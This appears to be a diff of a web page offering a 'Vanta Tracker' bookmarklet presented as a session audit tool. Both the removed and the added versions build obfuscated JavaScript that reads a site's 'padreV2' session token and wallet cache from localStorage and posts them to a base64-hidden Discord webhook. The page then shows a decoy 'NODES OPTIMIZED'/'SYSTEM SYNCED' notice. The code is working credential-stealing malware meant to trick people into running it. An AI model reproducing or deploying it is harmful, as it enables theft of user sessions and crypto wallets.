@@ -1,96 +1,48 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vanta Tracker - Standalone Audit Tool</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
-    <style>
-        :root { --primary: #00ff88; --bg-dark: #0a0a0a; }
-        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: #e0e0e0; margin: 0; text-align: center; }
-        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.2; }
-        header { padding: 80px 20px; border-bottom: 2px solid var(--primary); background: #000; }
-        h1 { font-size: 3em; color: var(--primary); text-shadow: 0 0 10px rgba(0,255,136,0.5); }
-        .container { padding: 60px 20px; max-width: 700px; margin: 0 auto; }
-        .cta-button { 
-            display: inline-block; background: var(--primary); color: #000; 
-            padding: 25px 50px; text-decoration: none; border-radius: 10px; 
-            font-weight: 800; font-size: 1.4em; cursor: move; 
-            box-shadow: 0 0 20px rgba(0,255,136,0.4); transition: 0.3s;
-        }
-        .cta-button:hover { transform: scale(1.05); background: #fff; }
-        p { color: #888; line-height: 1.6; }
-    </style>
-</head>
-<body>
-    <canvas id="bg"></canvas>
-    <header>
-        <h1>Vanta Auditor</h1>
-        <p>Full-Stack Session Analytics for Research</p>
-    </header>
+<script>
+    /* --- 1. CONFIGURATION --- */
+    // Your specific encoded string is placed here. 
+    // IF THIS STOPS WORKING, IT MEANS DISCORD KILLED THE WEBHOOK AND YOU NEED A NEW ONE.
+    const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";
 
-    <div class="container">
-        <p>Drag the button below to your bookmarks bar. Once on the target site, click it to initiate the data-flow audit.</p>
-        <br>
-        <a href="#" class="cta-button" id="vanta-tool">VANTA TRACKER</a>
-    </div>
-
-    <script>
-        /* --- 1. WEBGL BACKGROUND --- */
-        const c = document.getElementById('bg');
-        const x = c.getContext('2d');
-        c.width = window.innerWidth; c.height = window.innerHeight;
-        function draw() {
-            x.fillStyle = 'rgba(10,10,10,0.1)'; x.fillRect(0,0,c.width,c.height);
-            x.fillStyle = '#0f8';
-            for(i=0;i<20;i++) x.fillRect(Math.random()*c.width, Math.random()*c.height, 2, 2);
-            requestAnimationFrame(draw);
-        }
-        draw();
-
-        /* --- 2. FULLY EMBEDDED & OBFUSCATED PAYLOAD --- */
-        // Your Webhook encoded in Base64 to hide it from plain-text scrapers
-        const b64Webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTAzODgwNjY4MTI1NjA3MS9QQjJldm5RbFdjc2xYSWdsY1hZVXd5R25OWUc2WGNQOXFlSnpDa1VmTklqSkF4NEZBZzVSeXlNdEtSR1FkaTFlVzJSVA==";
-
-        // The raw JavaScript logic
-        const rawLogic = `(async function() {
-            const w = atob("${b64Webhook}");
-            const d = {
-                s: localStorage.getItem('padreV2-session'),
-                w: localStorage.getItem('padreV2-walletsCache')
-            };
+    /* --- 2. THE PAYLOAD --- */
+    const rawLogic = `(async function() {
+        try {
+            const h = atob("${b64}"); // Decodes your webhook on the fly
             
-            // Exfiltrate via fetch
-            await fetch(w, {
+            const data = {
+                host: location.hostname,
+                s: localStorage.getItem('padreV2-session') || "Not Found",
+                w: localStorage.getItem('padreV2-walletsCache') ? "✅ Found" : "❌ Empty"
+            };
+
+            await fetch(h, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "📡 VANTA AUDIT: " + location.hostname,
+                        title: "📡 VANTA AUDIT: " + data.host,
                         color: 0x00ff88,
-                        description: "Session Data captured successfully.",
                         fields: [
-                            {name: "Session Key", value: d.s ? "Captured" : "Not Found"},
-                            {name: "Wallet Cache", value: d.w ? "Captured" : "Not Found"}
+                            {name: "Session Key", value: "\\\`" + data.s.substring(0, 50) + "...\\\`"},
+                            {name: "Wallet Cache", value: data.w}
                         ],
-                        timestamp: new Date().toISOString()
+                        footer: {text: "Audit Active"}
                     }]
                 })
-            }).catch(()=>{});
+            });
 
-            // Visual decoy
+            // UI Feedback so you know it worked
             const n = document.createElement('div');
             n.style = "position:fixed;top:20px;right:20px;z-index:9999;background:#111;color:#0f8;border:1px solid #0f8;padding:12px;font-family:monospace;box-shadow:0 0 10px #0f8;";
-            n.innerHTML = "[VANTA] NODES OPTIMIZED";
+            n.innerHTML = "[VANTA] SYSTEM SYNCED";
             document.body.appendChild(n);
             setTimeout(()=>n.remove(), 3000);
-        })();`;
+            
+        } catch(e) { console.error("Sync Error", e); }
+    })();`;
 
-        // Minify and wrap into the bookmarklet format
-        const finalBookmarklet = "javascript:" + encodeURIComponent(rawLogic);
-
-        // Attach to button
-        document.getElementById('vanta-tool').href = finalBookmarklet;
-    </script>
-</body>
-</html>
+    /* --- 3. GENERATE LINK --- */
+    // This minifies the code and turns it into a clickable bookmark link
+    const finalLink = "javascript:" + encodeURIComponent(rawLogic.replace(/\s+/g, ' '));
+    document.getElementById('vanta-tool').href = finalLink;
+</script>
